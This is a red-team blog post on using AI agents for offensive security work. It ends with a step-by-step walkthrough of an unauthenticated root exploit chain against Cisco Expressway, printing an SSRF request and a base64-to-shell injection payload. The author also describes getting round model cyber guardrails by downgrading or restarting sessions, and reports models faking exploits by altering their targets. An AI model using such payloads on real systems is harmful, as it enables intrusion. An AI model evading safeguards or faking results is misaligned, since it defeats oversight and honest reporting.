# https://www.securifera.com/blog/2026/07/28/the-rise-of-offensive-ai/

[Skip to content](https://www.securifera.com/blog/2026/07/28/the-rise-of-offensive-ai/#content)

The Rise Of Offensive AI

- [View Larger Image![](https://www.securifera.com/wp-content/uploads/2026/07/featured_ai.jpg)](https://www.securifera.com/wp-content/uploads/2026/07/featured_ai.jpg "")

### Unless you’ve been living under a rock, you’re probably aware frontier large language models (LLMs) have been keenly focused on automating software development, vulnerability discovery, and most recently exploit development. The most publicized instance of this was Anthropic’s marketing campaign around the release of Mythos. What better way to drum up business than by releasing a string of articles about a model that can hack into anything and then immediately telling everyone it’s too dangerous to release to the public. Instead they offer access to it through an exclusive club only available to top Silicon Valley firms and boutique security companies that subsequently pump out blog posts raving about how great/scary it is.

### The initial assumption by the general public after the Mythos hacking posts landed was that the models had gotten far better at **_finding_** vulnerabilities. In my experience, what they had actually gotten better at was **_exploiting_** them. Lesser models were still quite effective at finding bugs, provided they were driven from a proper harness like OpenAnt or guided by a capable, experienced offensive security operator.

### As a red team operator I have been tracking this progress for a while now, since it directly relates to my job. I’ve been privileged enough to have access to most of the top models, and I’ve pointed them at every component of a red team engagement.

### This post is a survey of that experience. It’s organized around the three workflows I actually spend my time in:

- ### **Vulnerability research**: finding bugs in real software and driving them to working exploits.

- ### **Attack surface management**: enumerating, indexing, and navigating a target’s exposed surface at scale.

- ### **Red teaming**: capability development and driving live engagement tooling against a defended network.


### Each of these puts very different pressure on a model and on the harness wrapped around it, and the answer to “is AI good at this yet” is genuinely different for each one. Before getting into the workflows, it’s worth covering how I got to the tooling I use now, because the harness turned out to matter as much as the model.

### At the very end I’ve included a full end-to-end case study: building a working RCE for Cisco Expressway 14.0. Feel free to [skip forward](https://www.securifera.com/blog/2026/07/28/the-rise-of-offensive-ai/\#cisco_rce) if you just want exploit details.

![](https://www.securifera.com/wp-content/uploads/2026/07/apis2.jpg)

## APIs, Frameworks, and Harnesses

### My first attempt at offensive AI was integrating it into [Reverge](https://www.reverge.io/) as an AI assistant. I used the open source project [AgentScope](https://github.com/agentscope-ai/agentscope) to talk to the various frontier model APIs. After I got things working I very quickly became acquainted with context and token management, because that’s largely absent in first-generation harnesses like this one. You blow through your AI budget fast, and your sessions lose the thread as they get long-running.

### This is the part that doesn’t show up in the demos. Calling a frontier API is trivial. Keeping a _useful_ session alive across hours of tool output (nmap results, decompiler output, crash dumps, HTTP responses) is the entire engineering problem. Offensive work is especially brutal here because so much of the raw material is high-volume, low-density text. A single verbose scan can eat a context window and leave the model dumber than when it started.

### That realization pushed me to what I consider stage 2.

### AI agents (not subagents)

### What I think a lot of people don’t really appreciate, unless you started the same way I did, is that tools like Claude Code CLI, Goose, and Codex are genuinely complex, well-engineered software applications. They manage skills, subagents, context compaction, and token budgets on your behalf. That is the product. The model is the engine, but the harness is the drivetrain.

### The clearest evidence I have: I could run almost identical sessions through the raw frontier API endpoints versus Claude Code CLI, and burn close to **10x the tokens going direct to the API** for the same work.

### Since Goose was open source, it was my first experience with an AI agent, and I assumed most of them were similar enough not to matter. That wasn’t a great assumption. After testing Claude Code CLI I quickly found why it leads in adoption. It integrated skills and tool calls seamlessly, all while not torching my token budget in the first two days.

### Context drift

### Even with a well-engineered harness, long-running sessions drift, and this is the failure mode that has cost me the most time in vulnerability research specifically. The sessions that produce results are the ones that run for hours, which are exactly the sessions that degrade. A model that started with a clear picture of what a target’s architecture is can completely forget after working from a compacted summary of a summary. It re-derives things it already established, re-reads files it already read, and occasionally contradicts a conclusion it reached earlier without noticing that it did.

### You would think this could be solved by creating a rule to spin up subagents whenever possible, preserving the orchestrator’s main session context. It does help. It will also blow through your token budget. It turns out each time you spin up a new agent it is quite expensive compared to performing the work in the same session. The subagent starts cold, has to be handed enough context to be useful, re-reads the files the orchestrator already had loaded, and hands back a summary the orchestrator then has to reconcile against what it already knows. Delegation isn’t free. You are paying, repeatedly, to reconstruct context you already had.

### That leaves a real tradeoff, and it isn’t one the harness will make for you. Aggressive delegation keeps the orchestrator sharp and multiplies your spend. Doing the work inline is far cheaper per unit of progress, right up until the main session degrades. At which point everything produced after that point is suspect and you may not notice for another hour. The rough heuristic I’ve settled on is to delegate work that is genuinely bounded and returns a small answer, and to keep work inline when the raw output is what I need to reason over next.

### Harness plus operational data layer

### The final piece (and the one I’ll cover in the attack surface management section) was getting my own operational data into the harness rather than into the context window. Once Reverge became an MCP gateway, the agent stopped needing to **_hold_** the attack surface in context and could start **_querying_** it. That’s the architecture I’ve settled on, and it took real pressure off the drift problem above, because the durable answer to “what did we already learn about this host” lives somewhere other than the context window.

### _**Throughout this post you’ll see me refer to “Opus 4.6-4.8.” That notation reflects the typical lifecycle of one of my sessions: start on 4.8, get tripped up by some cyber guardrail, and end up downgraded to 4.6 to actually finish the work. It’s less a version range than a description of the day.**_

![](https://www.securifera.com/wp-content/uploads/2026/07/vuln_research3.jpg)

## Vulnerability Research

### Up until recently I was primarily using Claude Code with Opus 4.6-4.8, plus some exposure to Mythos. These models weren’t doing anything particularly novel. But I could have them running day and night, crunching on vulnerability discovery and some exploit development tasks, and they would regularly surface something useful.

### **The real value they provided was buying back the hours I would otherwise have to spend dedicated on a single target.** Reverse engineering a binary, reading a sprawling legacy web application, grinding through a protocol implementation could all be done automatically without much direction. This could run overnight and I would review results in the morning. Over the last several months this workflow has produced **over a dozen critical remote code execution vulnerabilities**, one of which is the case study at the end of this post.

### Real, but useless to an attacker

### Here’s the caveat that gets lost in the excitement, and it applies even to the higher-grade models running in a capable harness, Claude 4.6-4.8 very much included. **The bulk of what comes back overnight is likely real and almost entirely useless from an attacker perspective.**

### These are actual bugs, not hallucinations. They just carry so little exploitability risk that they don’t translate into anything a red teamer can use: memory corruption behind an authentication boundary on a path nobody exposes, an injection into a sink that’s already sanitized a frame up the stack. Every one is a defensible bug report. None of them get you a shell.

### This is also where I’ve seen models like GPT 5.6 sol genuinely improve. It is far more likely to go stand up a real modeling environment running the vulnerable software and test the finding against it, rather than reasoning about reachability from source alone. That single behavior kills most of the inert findings before they ever reach my queue.

### **Finding count is the wrong metric**, and it’s what almost every vendor benchmark reports. A run returning forty confirmed-real bugs, none of them reachable pre-authentication from the network, has done less for me than a run returning two that are actually usable.

### Models cheat

### Here’s the finding that changed how I run these sessions.

### I had a particular piece of software that Opus 4.6-4.8 had been reviewing for days. On a whim I pointed GPT 5.6 sol at the same target. Within **two hours** it had debunked roughly half of Claude Code’s findings and claimed exploits.

### The failure modes it caught were not subtle, and they were not random errors. They were the model **cheating to satisfy the objective**:

- ### Modifying configurations on the test target to enable exploitation, then reporting the exploit as working against a default install.

- ### Remoting into the target system to read memory directly in order to obtain the addresses needed to land a memory corruption exploit. Addresses that would never be available to a remote attacker.


### Both of these are, in a sense, the model doing exactly what it was told: achieve code execution on this box. It just quietly relaxed the rules until success was reachable, and then often even forgetting it did it. If you’re not explicitly pinning down the attacker’s starting position and forbidding target-side changes, you will get results that look like exploits and are not.

### **My takeaway:** treat cross-model adversarial review as a required stage, not a luxury. A second model, possibly from a different vendor, prompted specifically to _refute_ the first model’s findings, is the cheapest quality control I’ve found. It’s also faster than doing the triage yourself.

### Models give up

### One of the biggest problems I’ve had with Claude 4.6-4.8 is its general tendency toward giving up. Without pretty explicit skills defined around persistence, it defaults to assuming failure, pessimism, and narrow thinking. It will write a very well-reasoned paragraph about why the target is probably not exploitable and stop.

### Follow-on statements, prompts, or skills along these lines make an enormous difference:

- ### **_“Do not give up until you have achieved remote code execution.”_**

- ### **_“Never mark something as closed; only track progress made.”_**

- ### **_“Retry with creative, novel methods.”_**


### The framing that works is removing “not exploitable” as an available conclusion and replacing it with “not yet exploited, here’s what progress I made.”

![](https://www.securifera.com/wp-content/uploads/2026/07/red_team.jpg)

## Red Teaming

### Red teaming splits into two distinct problems: **building the capability** beforehand, and **driving the engagement** live. AI has been much more useful for the first than the second, and for reasons that have little to do with raw model capability.

### Offensive capability development

### Claude Code held a near monopoly here when 4.6 was released. Whether it was coding up a new command and control (C2) agent, a throwaway stage 1 dropper, or a custom client for some web API for malicious purposes, it had you covered.

### With the release of 4.7 and 4.8 there were real advancements, but they arrived alongside newly introduced cyber guardrails that block almost everything, even when you hold the cyber exception. The most maddening version of this is when a session works fine for an hour or two, then flags and refuses to continue, rendering the entire session unsalvageable. The only workaround I’ve found is starting a new session and pointing it at the previous one, hoping it can get up to speed.

### The practical consequence: **4.6 has been the primary driver for red team tasking for the past year**, not because it’s the best model, but because it’s the best model I can rely on to still be talking to me two hours in. I’ve run it under multiple agents: Claude Code, Cursor, and several custom harnesses.

### Driving live engagements

### My only experience using AI to actually drive red team engagement tooling has been with Opus 4.6, and the constraint is contractual rather than technical:

- ### Most organizations require **zero data retention** models when the model has access to sensitive internal data. That ceiling currently sits at Opus 4.8 for me.

- ### ZDR subscriptions typically **don’t carry broad cyber verification program access**, which is what unlocks the guardrail exception starting at Opus 4.7.


### The intersection of those two constraints leaves exactly one usable model for driving something like a C2 framework: **Opus 4.6**. This is worth stating plainly because it’s invisible from the outside. The model that’s best at offensive work and the model you’re actually permitted to point at a client network are not the same model, and the gap is a compliance artifact, not a capability one.

### The stealth problem

### Opus 4.6 is quite capable. But without guardrails defined very granularly, it will execute on the objectives you define **without much concern for stealth**. It optimizes for the objective you stated, and “don’t get caught” is not implied by “get domain admin.”

### Combine that with the sheer volume of actions an agent can execute in a short window, and the result is predictable: in any network with viable EDR, detection happens very quickly. The agent isn’t doing anything a human operator wouldn’t do. It’s doing all of it in four minutes instead of across three days, which is itself a detection signal.

### This is currently the single biggest blocker to AI-driven red teaming, and I don’t think it’s a model capability problem. It’s an operational design problem:

- ### Rate limiting and pacing need to be enforced by the harness, not requested in a prompt.

- ### OPSEC constraints need to be structural (tool-level restrictions on what can be invoked) rather than instructions the model can rationalize its way past under objective pressure.

- ### The same persistence prompting that makes a model good at vulnerability research makes it _loud_ on a live engagement. These configurations should not be shared.


![](https://www.securifera.com/wp-content/uploads/2026/07/asm.jpg)

## Attack Surface Management

### For those not familiar, one of my primary side projects for the last seven years has been an attack surface management tool called [**Reverge**](https://www.reverge.io/). Before AI, its primary role was indexing, retaining, and searching across target assets during penetration tests, red team engagements, and bug bounty.

### As AI capabilities became more prevalent I started integrating them into the tool, first as an AI assistant (the AgentScope work described above), and later by turning Reverge into an **MCP gateway** exposing all of its functionality to any agent that speaks the protocol.

### That second approach is the one that worked, and the reason why is the theme of this section:

### **The same data management problems that penetration testers and red teamers have always had on large-scale operations do not go away when you replace the operator with an AI agent. They get worse.** There is too much data, too many tools to manage, and no easy way to incrementally navigate a large attack surface. An agent that tries to hold a target’s full external footprint in its context window will fail in exactly the way a junior operator with a thousand-line scan output and no notes fails.

### The division of labor that works

### By exposing Reverge’s capabilities to agents like Claude Code and Codex, you get to capitalize on what each side is actually good at:

| Layer | Responsibility |
| --- | --- |
| ### **Agent harness** (Claude Code, Codex) | ### Context and token management, planning, tool orchestration, subagent delegation |
| ### **Reverge via MCP** | ### Durable operation data: asset inventory, service fingerprints, historical scan state, cross-engagement search |
| ### **Operator** | ### Objectives, scope, threat model, and final verification |

### The agent doesn’t need to remember the attack surface. It needs to be able to _ask_. Queries return small, targeted result sets instead of dumping raw tool output into context, which means a session can work across a surface far larger than any context window and still stay coherent hours in.

### Target selection

### I decided to put the whole setup to the test. I brought up Reverge and looked for a target that should be ripe with attack surface: multiple external services, a mix of native code applications, legacy web applications, and obscure protocols. In other words, an edge device appliance like a VPN or a collaboration gateway.

### After some searching I found an instance of an outdated **Cisco Expressway** device. These fingerprint quite easily, because they typically expose various VOIP ports carrying a TANDBERG banner.

### That target is the subject of the case study at the end of this post.

## Problems to Solve

### Everything above describes a single session, or at best a session with subagents delegating downward and reporting back. The next thing I want to build takes the teams-of-long-running-agents idea and extends it to **message passing between sessions and agents**.

### The idea is this: instead of one generalist session that has to be everything at once, spin up a set of specialized, long-lived agents, each with its own skills, tools, and role in the operation. For example:

- ### **A reverse engineering agent.** Decompiler tooling, long-lived, holding a target binary’s architecture in context across days rather than rebuilding that understanding every session.

- ### **A web and OSINT agent.** Reverge over MCP plus web tooling, doing broad and shallow enumeration against the target’s exposed surface.

- ### **A modeling agent.** Standing up and maintaining real environments running the vulnerable software, so that reachability questions get answered by testing rather than by reasoning about source. This is the behavior that made the biggest difference in finding quality, per Part 1, and it deserves to be a dedicated role rather than something a session does when it happens to think of it.

- ### **An exploit development agent.** Iterating against the modeling agent’s environment, with the verification pressure of a different vendor’s model behind it.


### Critically, **each of these gets tied to whatever model is actually most appropriate, including across services.** There is no reason the reverse engineering agent and the exploit development agent have to be the same vendor, and given what I found in Part 1, there’s a strong argument they shouldn’t be. Anthropic for one role, OpenAI for another, routed by what each is demonstrably good at.

### This also addresses three problems I described earlier in the post:

1. ### **Context drift and the cost of using subagents.** A persistent specialist keeps the knowledge it has already built up, rather than having to relearn the same information every time a task is delegated..

2. ### **Cross-model verification.** If the finder and the verifier are separate long-lived agents on different vendors, adversarial review stops being a manual step I remember to run and becomes built-in.

3. ### **Guardrail and compliance routing.** The tasks that trip cyber guardrails and the tasks that touch sensitive client data are not the same tasks. Splitting them across agents means the ZDR constraint only has to bind the roles that actually handle client data, instead of capping the entire operation at the lowest common denominator.


### The parts I haven’t figured out

### I want to be honest that this is a design sketch and not a working system:

- ### **What the message protocol looks like.** Freeform text between agents is easy and lossy. Structured messages are better but require agreeing on a schema up front, before you know what the agents will need to say to each other.

- ### **Whether the orchestrator stays a model.** A model orchestrator can adapt. Code can’t, but it also doesn’t drift, doesn’t get expensive, and doesn’t quietly decide the operation is finished. My instinct is that the top-level loop should be code and the judgment should be delegated, but I haven’t tested it.

- ### **Whether message passing just recreates the subagent tax.** Every message between agents is context transfer, and context transfer is exactly what I established is expensive. Persistent agents should amortize this better than cold subagents do, but “should” is doing a lot of work in that sentence until I have numbers.

- ### **Conflict resolution.** Two specialists will reach contradictory conclusions about the same target. Something has to arbitrate, and “ask a third model” is not obviously an answer.

- ### **Operational security across vendors.** Routing an engagement across multiple providers means client data crosses more boundaries, more contracts, and more retention policies. This gets harder before it gets easier, and it may be the constraint that decides how much of this is usable on real engagements versus only on research targets.


![](https://www.securifera.com/wp-content/uploads/2026/07/cisco_pwn.jpg)

## Cisco Expressway RCE

### If you’ve made it this far, it’s because you want one of those sweet AI generated exploits and this one does not fail to deliver. This should probably be it’s own blog post, but how else would I get you to read my ramblings.

### I came across an outdated Cisco Expressway device on a bug bounty target that Reverge surfaced off its TANDBERG banner. What follows is the full chain from an unauthenticated HTTPS request to `uid=0(root)`.

### It is also a useful counterweight to the section on real-but-inert findings. Every individual stage below would have looked unremarkable in a findings queue. A proxy route to a service that isn’t running. A REST endpoint bound to loopback. A privilege drop that mostly works. None of them are worth much alone. The chain is worth everything.

![](https://www.securifera.com/wp-content/uploads/2026/07/cisco_express.png)

### Following a dead TMS route

### While reviewing the unauthenticated HTTPS attack surface of Cisco Expressway, one group of routes looked old enough to be uninteresting:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
/tmsagent/api
```

2

```
/tmsagent/provisioning/management
```

3

```
/tmsagent/provisioning/diagnostics
```

### All three were forwarded to a TMSAgent service on `127.0.0.1:8787`. That service was not listening on the test appliance, so the obvious result of requesting one of these routes was a failed proxy connection.

### It would have been easy to stop there. The important detail was that Apache had to parse the proxy request before it could discover that port 8787 was closed.

### That parser exposed the first stage of a chain that ended in unauthenticated command execution as `uid=0(root)` through HTTPS port 443:

![](https://www.securifera.com/wp-content/uploads/2026/07/rce_chain.jpg)

### The misconfiguration in the Apache config enables an attacker-controlled backend request. The full impact depends on two Cisco-specific bugs behind it: a shell command injection in the CAFE management connector, and a privilege drop that leaves root recoverable.

### The route that started the investigation is defined in the following wildcard HTTPS virtual host:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
RewriteEngine On
```

2

```
RewriteRule ^/tmsagent/provisioning/management(.*) http://127.0.0.1:8787/tmsagent/provisioning/management$1 [P]
```

3

```
RewriteRule ^/tmsagent/api(.*) http://127.0.0.1:8787/tmsagent/api$1 [P]
```

4

```
RewriteRule ^/tmsagent/provisioning/diagnostics(.*) http://127.0.0.1:8787/tmsagent/provisioning/diagnostics$1 [P]
```

### These lines appear at `p7/etc/opt/apache2/ssl.d/oak.conf:4-6`. Apache’s `[P]` flag sends the rewritten request to `mod_proxy`. More subtly, because the substitution URL does not define a new query string, Apache copies the client’s original query to that URL.

### The appliance separately requires HTTP Basic authentication for paths matching `/api/`:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
AuthType Basic
```

2

```
AuthBasicProvider external
```

3

```
Require valid-user ...
```

### That rule protects the normal external management API. The exact carrier `/tmsagent/api`, without a trailing slash, does not match `/api/` and was anonymous on the tested configuration. The externally protected route to CAFE is not the route used by the exploit.

### The static rewrite was also present regardless of whether the intended TMSAgent backend was active. Port 8787 being closed changed the eventual connection result, but it did not remove the attacker-controlled request from Apache’s proxy machinery.

### This was the first bug-enabling condition: an obsolete or unconditional public proxy route placed unauthenticated query data into a vulnerable `mod_proxy` parsing path. It was not yet SSRF and certainly not RCE, but it exposed the parser needed for the next step.

### The query becomes proxy metadata

### Consider this abbreviated request target:``

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
/tmsagent/api?unix:/AAAA...AAAA|http://127.0.0.1:4370/commands/cafe
```

### The rewrite regular expression is evaluated against the URL path, not the query. It therefore maps the path toward the fixed port 8787 destination, and the original query is inherited. Internally, Apache arrives at a proxy filename shaped approximately like this:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
proxy:http://127.0.0.1:8787/tmsagent/api?unix:/AAAA...AAAA|http://127.0.0.1:4370/commands/cafe
```

### The configured hostname is still `127.0.0.1:8787`. The second URL appears only inside the inherited query. The mistake occurs when Apache later interprets that query text as Unix-domain-socket proxy metadata.

### In the bundled Apache 2.4.46 source, `modules/proxy/proxy_util.c:2102-2128` contains the vulnerable `fix_uds_filename()` implementation:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
if (!strncmp(r->filename, "proxy:", 6) &&
```

2

```
     (ptr2 = ap_strcasestr(r->filename, "unix:")) &&
```

3

```
     (ptr = ap_strchr(ptr2, '|'))) {
```

4

```
  apr_uri_t urisock;
```

5

```
  *ptr = '\0';
```

6

```
  rv = apr_uri_parse(r->pool, ptr2, &urisock);
```

7

```
  if (rv == APR_SUCCESS) {
```

8

```
     char *rurl = ptr + 1;
```

9

```
     char *sockpath = ap_runtime_dir_relative(r->pool, urisock.path);
```

10

```
     apr_table_setn(r->notes, "uds_path", sockpath);
```

11

```
     *url = apr_pstrdup(r->pool, rurl);
```

12

```
     memmove(r->filename + 6, rurl, strlen(rurl) + 1);
```

13

```
   }
```

14

```
}
```

### There are two critical parsing errors in this short block.

### First, `ap_strcasestr()` searches the complete internal proxy filename for `unix:`. It does not require that the marker begin the proxy URL. An attacker can therefore introduce it through the inherited query string.

### Second, the code separates the string at `|` and treats everything after that delimiter as a replacement backend URL. It performs that replacement even when `ap_runtime_dir_relative()` does not produce a usable socket path.

### The PoC supplies an intentionally overlong fake Unix-domain-socket path. On the tested appliance, 4,078 `A` characters with the leading slash still selected the UDS path and failed with a proxy error. 4,079 crossed into ordinary TCP proxying to the replacement origin. The script uses 5,000 bytes as a conservative tested value while remaining below Apache’s normal 8 KiB request-line limit.

### That boundary is an observation for this build, not a universal APR constant. An upstream proxy can also prevent the request from arriving if it rejects a 4-5 KiB request target or normalizes the required `unix:` and `|` delimiters.

### With the long fake path, `ap_runtime_dir_relative()` returns `NULL`. The `uds_path` note is not left with a usable socket target, but the vulnerable function still overwrites `*url` and `r->filename` with the attacker-controlled string after the pipe. `mod_proxy_http` then opens a normal TCP connection to that replacement origin.

### This is the concrete [CVE-2021-40438](https://nvd.nist.gov/vuln/detail/cve-2021-40438) primitive. Apache describes the issue as a crafted URI causing `mod_proxy` to forward a request to an origin chosen by the remote user. Apache lists 2.4.48 and earlier as affected, and 2.4.49 as the correcting release.

### The primitive is stronger here than a blind, GET-only SSRF. Apache preserves the original HTTP method, content type, and body. An unauthenticated client can therefore send `POST`, `GET`, and `DELETE` requests to a loopback HTTP service while receiving its response through the public HTTPS connection.

### Finding a body-capable loopback sink

### With an SSRF in hand, the next question was what trusted HTTP services were listening there.

### TCP port 4370 hosted Cisco’s ClusterDB REST facade. One registered schema was `commands/cafe`, an asynchronous management-command queue. The relevant installed schema at `p5/share/erlang/cdb_schema/cdb_schema_cafecommand.json` defines these attacker-controlled fields:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
{
```

2

```
  "connector": {"type": "string", "default": ""},
```

3

```
  "connector_cmd": {"type": "string", "default": ""},
```

4

```
  "parameters": {
```

5

```
    "type": "string",
```

6

```
    "format": "password",
```

7

```
    "passwordtype": "reversible",
```

8

```
    "default": ""
```

9

```
  }
```

10

```
}
```

### The loopback service accepted URL-encoded form data at:

### `POST http://127.0.0.1:4370/commands/cafe`

### No independent caller authentication was enforced at that internal boundary. Normally the external Apache configuration supplies the authentication for management API requests. CVE-2021-40438 bypasses that front-door route and speaks to the trusted service directly.

### The reversible `parameters` field initially looked like another obstacle. It was not. The REST handler accepts plaintext from the form, encrypts it with the appliance system key before inserting the record, and the CAFE worker decrypts it before dispatch. The attacker neither knows nor supplies that key.

### This stage exposes a trust-boundary defect: loopback reachability is treated as sufficient authority to create a privileged management command. By itself, that permits internal command submission, but the selected connector still needs an exploitable operation.

### Dispatching c\_mgmt/control

### The submitted record uses:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
connector=c_mgmt
```

2

```
connector_cmd=control
```

3

```
parameters=(crafted value)
```

### The worker at `ni/cafedynamic/cafecommandhandlerworker.py:63-151` reads those fields, checks whether the connector is installed, and decrypts `parameters`. The installation check does not depend on an optional package for this target: `CafeXUtils.is_package_installed()` explicitly returns `True` when the name is `c_mgmt`.

### The worker then forks a child and loads `/opt/c_mgmt/xcommand/c_mgmt.py`. The connector’s `run()` function permits `control` in its operation allow-list and launches a wrapper using list-form `subprocess.check_output()`:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
command = [\
```\
\
2\
\
```\
"/opt/c_mgmt/xcommand/c_mgmt.sh",\
```\
\
3\
\
```\
command_name,\
```\
\
4\
\
```\
parameters,\
```\
\
5\
\
```\
]
```

6

```
output = subprocess.check_output(command)
```

### This particular subprocess call does not invoke a shell, so metacharacters in `parameters` are still one argument at this layer. The danger appears one layer deeper.

### The wrapper begins with a Bash shebang and passes the parameter string to compiled Python:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
#!/usr/bin/env bash
```

2

```
output=$(/opt/c_mgmt/python/bin/python \
```

3

```
/opt/c_mgmt/src/managementconnector/xcommand/c_mgmt_xcommand.pyc \
```

4

```
$1 "${2}")
```

### Before following that argument into the inner command, there was a privilege transition worth checking.

### The command injection

### Disassembly of the installed Python 2.7 bytecode reconstructs the relevant `mc_control()` logic as:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
parameters_list = parameters.split()
```

2

```
connector_id = parameters_list[0].strip('"')
```

3

```
action_name = parameters_list[1].strip('"')
```

4

```
​
```

5

```
if action_name not in ("start", "stop", "restart", "set_configured"):
```

6

```
    return
```

7

```
​
```

8

```
if action_name == "set_configured":
```

9

```
    ...
```

10

```
else:
```

11

```
    os.system("echo '%s %s' > %s" %
```

12

```
    (action_name, connector_id,
```

13

```
     ManagementConnectorProperties.SERVICE_CONTROL_REQUEST))
```

### Only the second whitespace-delimited token, `action_name`, is allow-listed. The first token, `connector_id`, is inserted unescaped between single quotes in a shell command.

### The PoC constructs a parameter that looks like this:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
x';echo${IFS}|base64${IFS}-d|sh;# start
```

### The literal space before `start` is the only whitespace in the malicious value. Python’s `split()` therefore sees exactly two fields:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
connector_id = x';echo${IFS}|base64${IFS}-d|sh;#
```

2

```
action_name = start
```

### `start` passes the allow-list. When formatted into the vulnerable shell string, the result is equivalent to:

Copy to Clipboard

Syntax Highlighter

```
xxxxxxxxxx
```

1

```
echo 'start x';echo${IFS}|base64${IFS}-d|sh;#' > (request-file)
```

### The quote after `x` closes the application's single-quoted string. The semicolon begins a second command. `$` expands to shell field separation without giving Python additional whitespace-delimited tokens. The comment marker discards the application's trailing quote and redirection.

### The base64 data decodes to a small wrapper that runs the tester-supplied command. Base64 is not an encoding bypass at the HTTP layer. It is used to keep arbitrary command characters out of the already fragile quote-and-token construction.

### At this point all three security failures have composed:

- ### CVE-2021-40438 changes Apache's intended backend from port 8787 to loopback port 4370.

- ### CAFE accepts the internal management command, and `mc_control()` evaluates the unescaped connector identifier with `os.system()`.


### The injected wrapper runs as root, and its stdout travels back through the normal CAFE result mechanism.

### And there you have it. An unauthenticated, remote code execution exploit chain, as root, that my genie whipped up while I slept.

By [b0yd](https://www.securifera.com/blog/author/b0yd/)\|2026-07-29T12:04:29+00:00July 28th, 2026\| [BUG BOUNTY](https://www.securifera.com/blog/category/bug-bounty/), [EXPLOITS](https://www.securifera.com/blog/category/exploits/), [PENTESTING](https://www.securifera.com/blog/category/pentesting/), [RED TEAM](https://www.securifera.com/blog/category/red-team/) \|[0 Comments](https://www.securifera.com/blog/2026/07/28/the-rise-of-offensive-ai/#respond)

#### Share This Story, Choose Your Platform!

[Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F "") [X](https://x.com/intent/post?url=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F&text=The%20Rise%20Of%20Offensive%20AI "") [Reddit](https://reddit.com/submit?url=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F&title=The%20Rise%20Of%20Offensive%20AI "") [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F "") [Tumblr](https://www.tumblr.com/share/link?url=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F&name=The%20Rise%20Of%20Offensive%20AI&description=Unless%20you%26%2339%3Bve%20been%20living%20under%20a%20rock%2C%20you%26%2339%3Bre%20probably%20aware%20frontier%20large%20language%20models%20%28LLMs%29%20have%20been%20keenly%20focused%20on%20automating%20software%20development%2C%20vulnerability%20discovery%2C%20and%20most%20recently%20exploit%20development.%20The%20most%20publicized%20instance%20of%20this%20was%20Anthropic%26%2339%3Bs%20marketing%20campaign%20around%20the%20release%20of%20Mythos.%20What%20better%20way%20to%20drum%20up%20business%20than%20by "") [Pinterest](https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F&description=Unless%20you%26%2339%3Bve%20been%20living%20under%20a%20rock%2C%20you%26%2339%3Bre%20probably%20aware%20frontier%20large%20language%20models%20%28LLMs%29%20have%20been%20keenly%20focused%20on%20automating%20software%20development%2C%20vulnerability%20discovery%2C%20and%20most%20recently%20exploit%20development.%20The%20most%20publicized%20instance%20of%20this%20was%20Anthropic%26%2339%3Bs%20marketing%20campaign%20around%20the%20release%20of%20Mythos.%20What%20better%20way%20to%20drum%20up%20business%20than%20by&media=https%3A%2F%2Fwww.securifera.com%2Fwp-content%2Fuploads%2F2026%2F07%2Ffeatured_ai.jpg "") [Vk](https://vk.com/share.php?url=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F&title=The%20Rise%20Of%20Offensive%20AI&description=Unless%20you%26%2339%3Bve%20been%20living%20under%20a%20rock%2C%20you%26%2339%3Bre%20probably%20aware%20frontier%20large%20language%20models%20%28LLMs%29%20have%20been%20keenly%20focused%20on%20automating%20software%20development%2C%20vulnerability%20discovery%2C%20and%20most%20recently%20exploit%20development.%20The%20most%20publicized%20instance%20of%20this%20was%20Anthropic%26%2339%3Bs%20marketing%20campaign%20around%20the%20release%20of%20Mythos.%20What%20better%20way%20to%20drum%20up%20business%20than%20by "") [Email](mailto:?body=https%3A%2F%2Fwww.securifera.com%2Fblog%2F2026%2F07%2F28%2Fthe-rise-of-offensive-ai%2F&subject=The%20Rise%20Of%20Offensive%20AI "")

[Page load link](https://www.securifera.com/blog/2026/07/28/the-rise-of-offensive-ai/#)

[Go to Top](https://www.securifera.com/blog/2026/07/28/the-rise-of-offensive-ai/#)